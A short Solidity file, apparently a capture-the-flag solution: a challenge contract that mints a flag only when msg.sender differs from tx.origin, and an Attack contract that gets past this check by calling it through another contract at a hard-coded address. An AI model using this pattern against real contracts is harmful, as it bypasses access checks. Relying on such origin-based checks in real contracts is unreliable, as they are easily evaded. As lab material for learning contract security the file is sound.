//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;


contract Attack {

    address target = 0xd40d55F7B57E59ef5fD8B32559e0C3cbeaaD5cfa;

    function exploit() external {
        Contract(target).capture();
    }
}

interface Flag {
    function mint(address) external;
}

contract Contract {
    address constant flag = 0x68CD31401aCada85d8d526bb348F88c5C988bB43;

    function capture() external {
        require(msg.sender != tx.origin, "msg.sender is equal to tx.origin");
        Flag(flag).mint(tx.origin);
    }
}